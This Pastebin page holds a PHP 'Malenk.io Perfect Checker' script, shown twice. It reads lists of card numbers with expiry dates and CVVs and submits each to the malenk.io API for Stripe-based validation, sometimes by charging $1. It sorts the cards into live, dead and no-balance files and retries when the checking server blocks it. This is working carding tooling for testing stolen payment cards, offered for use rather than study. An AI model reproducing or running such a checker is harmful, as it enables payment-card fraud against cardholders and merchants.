
Pastebin
paste
Login Sign up
Guest User
Untitled
a guest
Nov 21st, 2020
652
Never
Not a member of Pastebin yet? Sign Up, it unlocks many cool features!
10.06 KB

<?php
/**
 * Malenk.io Perfect Checker
 * @version : 1.0
 * @author  : Malenk.io
 * Have two type_check. charge 1$ (USD) and no charge version!
 * Input charge if you just want charge. Input random for random (charge or not)
 * Input anything/null if you just want non-charge type_check
 * U can change on config
 * Stripe decline code -> https://stripe.com/docs/declines/codes
 */
date_default_timezone_set("Asia/Jakarta");
$colors = new \Colors();
if(!file_exists("config.json")) {
    file_put_contents("config.json", json_encode(['key' => 'MASUKKAN KEY ANDA DISINI', 'type_check' => 'charge', 'result_dir' => 'BARU']));
}
 
if(!file_exists("alerts.txt")) {
    echo "Hello! Welcome to Malenk.io Checker! Please Update your config before run this source code!".PHP_EOL;
    echo "Are you updated this config.json (y/N) ";
    $updated = trim(fgets(STDIN));
    if(strtolower($updated) == "y") {
        file_put_contents("alerts.txt", "off");
    } else {
        die("Please update config.json before run this script!".PHP_EOL);
    }
}
 
$readConfig  = json_decode(file_get_contents("config.json"), true);
if(!is_dir($readConfig['result_dir'])) {
    mkdir($readConfig['result_dir']);
}
 
$i=0;
do {
    $isValidKeys = curl("http://malenk.io/api/?version=1.0", json_encode(['type' => 'validate_key', 'key' => $readConfig['key']]));
    if(isJson($isValidKeys)) {
        if(json_decode($isValidKeys, true)['error'] == false) {
            echo "[-] Key is ".$colors->getColoredString("VALID").PHP_EOL;
            echo "[-] Credit : ".$colors->getColoredString(number_format(json_decode($isValidKeys,1)['credit']), "white", "green").PHP_EOL.PHP_EOL;
            break;
        } else {
            echo "[!] ".$colors->getColoredString(json_decode($isValidKeys,1)['message'], "cyan", "red").PHP_EOL;
            break;
        }
    } else {
       echo "[!] ".$colors->getColoredString("Failed connect to server, contact admin if you dont know this error.", "red").PHP_EOL;
    }
    $i++;
    if($i==10) {
        exit();
    }
} while(true);
 
do {
    $path = input("Path List");
    if(!file_exists($path)) {
        $inputAgain = 1;
    } else if(!preg_match("/.txt/", $path)) {
        echo "[!] File must .txt extensions!".PHP_EOL;
        $inputAgain = 1;
    } else {
        $inputAgain = 0;
    }
} while($inputAgain);
 
$deleteDuplicate = input("Delete Duplicate Your List (y/N)? ");
if(strtolower($deleteDuplicate) == 'y') {
    $old_content = file_get_contents($path);
    $newPath = str_replace(".txt", "", $path);
    file_put_contents($newPath."_no_duplicate.txt", "");
    $o=0;
    foreach(explode("\n", str_replace("\r", "", $old_content)) as $content) {
        @list($ccnum, $ccmonth, $ccy, $ccv) = explode("|", trim($content));
        if(@!preg_match("/".trim($ccnum)."/", file_get_contents($newPath."_no_duplicate.txt"))) {
            //echo $ccnum." => Writed\n";
            file_put_contents($newPath."_no_duplicate.txt", $ccnum."|".$ccmonth."|".$ccy."|".$ccv.PHP_EOL, FILE_APPEND);
        }
        $o++;
    }
    $newPath = $newPath."_no_duplicate.txt";
    echo "[!] Updated no duplicate successfully. Try Checking with no duplicated list".PHP_EOL;
    echo "[!] New list path: ".$newPath.PHP_EOL.PHP_EOL;
} else {
    $newPath = $path;
}
 
$content = explode("\n", trim(file_get_contents($newPath)));
$lineNow = 1;
foreach($content as $format) {
    checking:
    $check = curl("http://malenk.io/api/?version=1.0", json_encode(['key' => trim($readConfig['key']), 'type' => 'check', 'type_check' => $readConfig['type_check'], 'format' => trim($format)]));
    if(isJson($check)) {
        if(json_decode($check,1)['status'] == "LIVE") {
            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['account_credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
            file_put_contents($readConfig['result_dir']."/live.txt", trim($format)." | ".json_decode($check,1)['bin']."".PHP_EOL, FILE_APPEND);
            sleep(3);
        } else if(json_decode($check,1)['status'] == "UNKNOWN") {
            $addMsg = "";
            if(isset(json_decode($check,1)['message'])) {
                $addMsg = "(".json_decode($check,1)['message'].")";
            }
            if(preg_match("/An error occurred while processing your card/", json_decode($check,1)['message'])) {
                echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Continue to next card! ".$addMsg.PHP_EOL;
                file_put_contents($readConfig['result_dir']."/unknown.txt", $format.PHP_EOL, FILE_APPEND);
            } else if(@json_decode($check,1)['try_recheck'] == true) {
                #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
                echo "== ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Wait for re-check from system. ".$addMsg.PHP_EOL;
               sleep(3);
                goto checking;
            } else {
                file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
                echo "== ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Wait for re-check from system. ".$addMsg.PHP_EOL;
                sleep(15);
                goto checking;
            }
        } else {
            if(@json_decode($check, 1)['decline_code'] == 'transaction_not_allowed') {
                file_put_contents($readConfig['result_dir']."/unknown_not_supported.txt", trim($format).PHP_EOL, FILE_APPEND);
            } else if(json_decode($check,1)['decline_code'] == 'insufficient_funds') {
                file_put_contents($readConfig['result_dir']."/die_no_balance.txt", trim($format).PHP_EOL, FILE_APPEND);
            } else if(json_decode($check,1)['message'] == "Invalid object") {
                goto checking;
            } else {
                file_put_contents($readConfig['result_dir']."/die.txt", trim($format).PHP_EOL, FILE_APPEND);
            }
            $declineCode = json_decode($check,1)['decline_code'] !== null ? "(".$colors->getColoredString(json_decode($check,1)['decline_code'], "white", "red").")" : '';
            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString(json_decode($check,1)['status'], "white", "red")." | ".$colors->getColoredString(json_decode($check,1)['message'], "red")." ".$declineCode." [CREDIT : ".$colors->getColoredString(json_decode($check,1)['account_credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
        }
    } else {
        #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
        echo "=====> Maybe your IP ".$colors->getColoredString("Blocked", "red")." by Server, waiting...".PHP_EOL;
       sleep(15);
        goto checking;
    }
 
    $lineNow++;
}
 
echo PHP_EOL.PHP_EOL."Checking Done! Powered by Malenk.io - ".$colors->getColoredString("Perfect Checker", "green")." Site With Accuracy 100%!";
 
function input($text) {
    echo $text.": ";
    $result = trim(fgets(STDIN));
    return $result;
}
 
function isJson($string) {
    return ((is_string($string) &&
            (is_object(json_decode($string)) ||
            is_array(json_decode($string))))) ? true : false;
}
 
function curl($url, $body=false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if($body !== false) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    $result = curl_exec($ch);
    curl_close($ch);
 
    return $result;
}
 
class Colors {
  private $foreground_colors = array();
	private $background_colors = array();
 
	public function __construct() {
		// Set up shell colors
		$this->foreground_colors['black'] = '0;30';
		$this->foreground_colors['dark_gray'] = '1;30';
		$this->foreground_colors['blue'] = '0;34';
		$this->foreground_colors['light_blue'] = '1;34';
		$this->foreground_colors['green'] = '0;32';
		$this->foreground_colors['light_green'] = '1;32';
		$this->foreground_colors['cyan'] = '0;36';
		$this->foreground_colors['light_cyan'] = '1;36';
		$this->foreground_colors['red'] = '0;31';
		$this->foreground_colors['light_red'] = '1;31';
		$this->foreground_colors['purple'] = '0;35';
		$this->foreground_colors['light_purple'] = '1;35';
		$this->foreground_colors['brown'] = '0;33';
		$this->foreground_colors['yellow'] = '1;33';
		$this->foreground_colors['light_gray'] = '0;37';
		$this->foreground_colors['white'] = '1;37';
 
		$this->background_colors['black'] = '40';
		$this->background_colors['red'] = '41';
		$this->background_colors['green'] = '42';
		$this->background_colors['yellow'] = '43';
		$this->background_colors['blue'] = '44';
		$this->background_colors['magenta'] = '45';
		$this->background_colors['cyan'] = '46';
		$this->background_colors['light_gray'] = '47';
	}
 
	// Returns colored string
	public function getColoredString($string, $foreground_color = null, $background_color = null) {
		$colored_string = "";
 
		// Check if given foreground color found
		if (isset($this->foreground_colors[$foreground_color])) {
			$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
		}
		// Check if given background color found
		if (isset($this->background_colors[$background_color])) {
			$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
		}
 
		// Add string and end coloring
		$colored_string .=  $string . "\033[0m";
 
		return $colored_string;
	}
 
	// Returns all foreground color names
	public function getForegroundColors() {
		return array_keys($this->foreground_colors);
	}
 
	// Returns all background color names
	public function getBackgroundColors() {
		return array_keys($this->background_colors);
	}
}

    ?>

RAW Paste Data
<?php
/**
 * Malenk.io Perfect Checker
 * @version : 1.0
 * @author  : Malenk.io
 * Have two type_check. charge 1$ (USD) and no charge version!
 * Input charge if you just want charge. Input random for random (charge or not)
 * Input anything/null if you just want non-charge type_check
 * U can change on config
 * Stripe decline code -> https://stripe.com/docs/declines/codes
 */
date_default_timezone_set("Asia/Jakarta");
$colors = new \Colors();
if(!file_exists("config.json")) {
    file_put_contents("config.json", json_encode(['key' => 'MASUKKAN KEY ANDA DISINI', 'type_check' => 'charge', 'result_dir' => 'BARU']));
}

if(!file_exists("alerts.txt")) {
    echo "Hello! Welcome to Malenk.io Checker! Please Update your config before run this source code!".PHP_EOL;
    echo "Are you updated this config.json (y/N) ";
    $updated = trim(fgets(STDIN));
    if(strtolower($updated) == "y") {
        file_put_contents("alerts.txt", "off");
    } else {
        die("Please update config.json before run this script!".PHP_EOL);
    }
}

$readConfig  = json_decode(file_get_contents("config.json"), true);
if(!is_dir($readConfig['result_dir'])) {
    mkdir($readConfig['result_dir']);
}

$i=0;
do {
    $isValidKeys = curl("http://malenk.io/api/?version=1.0", json_encode(['type' => 'validate_key', 'key' => $readConfig['key']]));
    if(isJson($isValidKeys)) {
        if(json_decode($isValidKeys, true)['error'] == false) {
            echo "[-] Key is ".$colors->getColoredString("VALID").PHP_EOL;
            echo "[-] Credit : ".$colors->getColoredString(number_format(json_decode($isValidKeys,1)['credit']), "white", "green").PHP_EOL.PHP_EOL;
            break;
        } else {
            echo "[!] ".$colors->getColoredString(json_decode($isValidKeys,1)['message'], "cyan", "red").PHP_EOL;
            break;
        }
    } else {
       echo "[!] ".$colors->getColoredString("Failed connect to server, contact admin if you dont know this error.", "red").PHP_EOL;
    }
    $i++;
    if($i==10) {
        exit();
    }
} while(true);

do {
    $path = input("Path List");
    if(!file_exists($path)) {
        $inputAgain = 1;
    } else if(!preg_match("/.txt/", $path)) {
        echo "[!] File must .txt extensions!".PHP_EOL;
        $inputAgain = 1;
    } else {
        $inputAgain = 0;
    }
} while($inputAgain);

$deleteDuplicate = input("Delete Duplicate Your List (y/N)? ");
if(strtolower($deleteDuplicate) == 'y') {
    $old_content = file_get_contents($path);
    $newPath = str_replace(".txt", "", $path);
    file_put_contents($newPath."_no_duplicate.txt", "");
    $o=0;
    foreach(explode("\n", str_replace("\r", "", $old_content)) as $content) {
        @list($ccnum, $ccmonth, $ccy, $ccv) = explode("|", trim($content));
        if(@!preg_match("/".trim($ccnum)."/", file_get_contents($newPath."_no_duplicate.txt"))) {
            //echo $ccnum." => Writed\n";
            file_put_contents($newPath."_no_duplicate.txt", $ccnum."|".$ccmonth."|".$ccy."|".$ccv.PHP_EOL, FILE_APPEND);
        }
        $o++;
    }
    $newPath = $newPath."_no_duplicate.txt";
    echo "[!] Updated no duplicate successfully. Try Checking with no duplicated list".PHP_EOL;
    echo "[!] New list path: ".$newPath.PHP_EOL.PHP_EOL;
} else {
    $newPath = $path;
}

$content = explode("\n", trim(file_get_contents($newPath)));
$lineNow = 1;
foreach($content as $format) {
    checking:
    $check = curl("http://malenk.io/api/?version=1.0", json_encode(['key' => trim($readConfig['key']), 'type' => 'check', 'type_check' => $readConfig['type_check'], 'format' => trim($format)]));
    if(isJson($check)) {
        if(json_decode($check,1)['status'] == "LIVE") {
            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".json_decode($check,1)['bin']." [".$colors->getColoredString("LIVE", "white", "green")."] [CREDIT : ".$colors->getColoredString(json_decode($check,1)['account_credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
            file_put_contents($readConfig['result_dir']."/live.txt", trim($format)." | ".json_decode($check,1)['bin']."".PHP_EOL, FILE_APPEND);
            sleep(3);
        } else if(json_decode($check,1)['status'] == "UNKNOWN") {
            $addMsg = "";
            if(isset(json_decode($check,1)['message'])) {
                $addMsg = "(".json_decode($check,1)['message'].")";
            }
            if(preg_match("/An error occurred while processing your card/", json_decode($check,1)['message'])) {
                echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Continue to next card! ".$addMsg.PHP_EOL;
                file_put_contents($readConfig['result_dir']."/unknown.txt", $format.PHP_EOL, FILE_APPEND);
            } else if(@json_decode($check,1)['try_recheck'] == true) {
                #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
                echo "== ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Wait for re-check from system. ".$addMsg.PHP_EOL;
               sleep(3);
                goto checking;
            } else {
                file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
                echo "== ".trim($format)." => ".$colors->getColoredString("UNKNOWN", "yellow")." Wait for re-check from system. ".$addMsg.PHP_EOL;
                sleep(15);
                goto checking;
            }
        } else {
            if(@json_decode($check, 1)['decline_code'] == 'transaction_not_allowed') {
                file_put_contents($readConfig['result_dir']."/unknown_not_supported.txt", trim($format).PHP_EOL, FILE_APPEND);
            } else if(json_decode($check,1)['decline_code'] == 'insufficient_funds') {
                file_put_contents($readConfig['result_dir']."/die_no_balance.txt", trim($format).PHP_EOL, FILE_APPEND);
            } else if(json_decode($check,1)['message'] == "Invalid object") {
                goto checking;
            } else {
                file_put_contents($readConfig['result_dir']."/die.txt", trim($format).PHP_EOL, FILE_APPEND);
            }
            $declineCode = json_decode($check,1)['decline_code'] !== null ? "(".$colors->getColoredString(json_decode($check,1)['decline_code'], "white", "red").")" : '';
            echo "[".date("H:i:s")." ".$lineNow." / ".count($content)."] ".trim($format)." => ".$colors->getColoredString(json_decode($check,1)['status'], "white", "red")." | ".$colors->getColoredString(json_decode($check,1)['message'], "red")." ".$declineCode." [CREDIT : ".$colors->getColoredString(json_decode($check,1)['account_credit'], "white", "green")."] [Check Type : ".json_decode($check,1)['check_type']."]".PHP_EOL;
        }
    } else {
        #file_put_contents("err.log", $check.PHP_EOL, FILE_APPEND);
        echo "=====> Maybe your IP ".$colors->getColoredString("Blocked", "red")." by Server, waiting...".PHP_EOL;
       sleep(15);
        goto checking;
    }

    $lineNow++;
}

echo PHP_EOL.PHP_EOL."Checking Done! Powered by Malenk.io - ".$colors->getColoredString("Perfect Checker", "green")." Site With Accuracy 100%!";

function input($text) {
    echo $text.": ";
    $result = trim(fgets(STDIN));
    return $result;
}

function isJson($string) {
    return ((is_string($string) &&
            (is_object(json_decode($string)) ||
            is_array(json_decode($string))))) ? true : false;
}

function curl($url, $body=false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    if($body !== false) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

class Colors {
  private $foreground_colors = array();
	private $background_colors = array();

	public function __construct() {
		// Set up shell colors
		$this->foreground_colors['black'] = '0;30';
		$this->foreground_colors['dark_gray'] = '1;30';
		$this->foreground_colors['blue'] = '0;34';
		$this->foreground_colors['light_blue'] = '1;34';
		$this->foreground_colors['green'] = '0;32';
		$this->foreground_colors['light_green'] = '1;32';
		$this->foreground_colors['cyan'] = '0;36';
		$this->foreground_colors['light_cyan'] = '1;36';
		$this->foreground_colors['red'] = '0;31';
		$this->foreground_colors['light_red'] = '1;31';
		$this->foreground_colors['purple'] = '0;35';
		$this->foreground_colors['light_purple'] = '1;35';
		$this->foreground_colors['brown'] = '0;33';
		$this->foreground_colors['yellow'] = '1;33';
		$this->foreground_colors['light_gray'] = '0;37';
		$this->foreground_colors['white'] = '1;37';

		$this->background_colors['black'] = '40';
		$this->background_colors['red'] = '41';
		$this->background_colors['green'] = '42';
		$this->background_colors['yellow'] = '43';
		$this->background_colors['blue'] = '44';
		$this->background_colors['magenta'] = '45';
		$this->background_colors['cyan'] = '46';
		$this->background_colors['light_gray'] = '47';
	}

	// Returns colored string
	public function getColoredString($string, $foreground_color = null, $background_color = null) {
		$colored_string = "";

		// Check if given foreground color found
		if (isset($this->foreground_colors[$foreground_color])) {
			$colored_string .= "\033[" . $this->foreground_colors[$foreground_color] . "m";
		}
		// Check if given background color found
		if (isset($this->background_colors[$background_color])) {
			$colored_string .= "\033[" . $this->background_colors[$background_color] . "m";
		}

		// Add string and end coloring
		$colored_string .=  $string . "\033[0m";

		return $colored_string;
	}

	// Returns all foreground color names
	public function getForegroundColors() {
		return array_keys($this->foreground_colors);
	}

	// Returns all background color names
	public function getBackgroundColors() {
		return array_keys($this->background_colors);
	}
}
?>
create new paste  /  syntax languages  /  archive  /  faq  /  tools  /  night mode  /  api  /  scraping api  /  news  /  pro
privacy statement  /  cookies policy  /  terms of serviceupdated  /  security disclosure  /  dmca  /  report abuse  /  contact

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the Cookies Policy.  OK, I Understand
Not a member of Pastebin yet?
Sign Up, it unlocks many cool features!
 
